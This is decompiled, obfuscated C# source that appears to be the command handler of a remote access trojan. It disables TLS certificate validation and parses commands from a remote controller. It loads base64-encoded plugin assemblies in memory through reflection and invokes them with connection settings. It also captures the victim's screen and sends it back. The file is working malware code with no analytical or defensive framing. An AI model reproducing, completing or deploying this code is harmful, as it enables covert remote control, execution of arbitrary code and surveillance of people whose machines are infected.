using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Reflection;
using System.Text;
using System.Windows.Forms;
using A;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using ns14;
using ns15;
using ns20;
using ns21;

namespace ns12;

public class GClass12
{
	private static object object_0 = GClass20.string_4;

	public static void smethod_0(byte[] byte_0)
	{
		//IL_01b2: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b9: Expected O, but got Unknown
		//IL_01fa: Unknown result type (might be due to invalid IL or missing references)
		//IL_0201: Expected O, but got Unknown
		ServicePointManager.ServerCertificateValidationCallback = C.A;
		try
		{
			GClass21.smethod_3(Conversions.ToString(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject((object)"OK", object_0), (object)GClass15.smethod_5()), object_0), GClass15.smethod_1())));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		string text = Conversions.ToString(GClass14.smethod_1(C.A(byte_0)));
		string[] array = Strings.Split(text, Conversions.ToString(object_0), -1, (CompareMethod)0);
		try
		{
			switch (array[0])
			{
			case "IPLM":
			{
				byte[] byte_3 = Convert.FromBase64String(array[1]);
				bool bool_ = false;
				smethod_1(C.A(byte_3, ref bool_), array[2]);
				break;
			}
			case "IPL":
			{
				C.a(array[2], array[1]);
				byte[] byte_2 = Convert.FromBase64String(C.b(array[2]));
				bool bool_ = false;
				smethod_1(C.A(byte_2, ref bool_));
				break;
			}
			case "CPL":
			{
				if (Operators.CompareString(C.b(array[1]), (string)null, false) == 0)
				{
					GClass21.smethod_3(Conversions.ToString(Operators.AddObject(Operators.AddObject((object)"GPL", object_0), (object)array[1])));
					break;
				}
				byte[] byte_ = Convert.FromBase64String(C.b(array[1]));
				bool bool_ = false;
				smethod_1(C.A(byte_, ref bool_));
				break;
			}
			case "!CAP":
				try
				{
					Rectangle bounds = Screen.get_PrimaryScreen().get_Bounds();
					Bitmap val = new Bitmap(Screen.get_PrimaryScreen().get_Bounds().Width, bounds.Height, (PixelFormat)135173);
					Graphics val2 = Graphics.FromImage((Image)(object)val);
					Size size = new Size(((Image)val).get_Width(), ((Image)val).get_Height());
					val2.CopyFromScreen(0, 0, 0, 0, size, (CopyPixelOperation)13369376);
					MemoryStream memoryStream = new MemoryStream();
					Bitmap val3 = new Bitmap(256, 156);
					Graphics val4 = Graphics.FromImage((Image)(object)val3);
					val4.DrawImage((Image)(object)val, new Rectangle(0, 0, 256, 156), new Rectangle(0, 0, ((Image)val).get_Width(), ((Image)val).get_Height()), (GraphicsUnit)2);
					((Image)val3).Save((Stream)memoryStream, ImageFormat.get_Jpeg());
					GClass21.smethod_3(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"#CAP", object_0), GClass15.smethod_0()), object_0), (object)Encoding.Default.GetString(memoryStream.ToArray()))));
					try
					{
						val2.Dispose();
						memoryStream.Dispose();
						((Image)val3).Dispose();
						val4.Dispose();
						((Image)val).Dispose();
						break;
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
						break;
					}
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
					break;
				}
			case "!P":
				GClass21.bool_1 = true;
				break;
			case "!PSend":
				GClass21.bool_2 = true;
				GClass21.smethod_3("!PStart");
				break;
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			GClass21.smethod_3(Conversions.ToString(Operators.AddObject(Operators.AddObject(Operators.AddObject((object)"MSG", object_0), (object)"Error! "), (object)ex2.Message)));
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_1(byte[] byte_0, string string_0 = null)
	{
		try
		{
			Type[] types = AppDomain.CurrentDomain.Load(byte_0).GetTypes();
			foreach (Type type in types)
			{
				MethodInfo[] methods = type.GetMethods();
				foreach (MethodInfo methodInfo in methods)
				{
					if (Operators.CompareString(methodInfo.Name, "CN", false) == 0)
					{
						methodInfo.Invoke(null, new object[10]
						{
							GClass20.string_1,
							GClass20.int_0,
							GClass21.string_0,
							GClass21.string_1,
							GClass20.string_2,
							GClass20.object_0,
							GClass20.object_1,
							GClass15.smethod_5(),
							GClass15.smethod_0(),
							GClass14.smethod_1(GClass20.string_0)
						});
					}
					else if (Operators.CompareString(methodInfo.Name, "MISC", false) == 0)
					{
						methodInfo.Invoke(null, new object[2]
						{
							GClass15.smethod_5(),
							string_0
						});
					}
					else if (Operators.CompareString(methodInfo.Name, "CL", false) == 0)
					{
						methodInfo.Invoke(null, new object[7]
						{
							GClass20.bool_16,
							GClass20.string_5,
							GClass20.object_0,
							GClass20.object_1,
							GClass15.smethod_9(),
							GClass15.smethod_5(),
							string_0
						});
					}
				}
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			GClass21.smethod_3(Conversions.ToString(Operators.AddObject(Operators.AddObject(Operators.AddObject((object)"MSG", object_0), (object)"Plugin Error! "), (object)ex2.Message)));
			ProjectData.ClearProjectError();
		}
	}
}
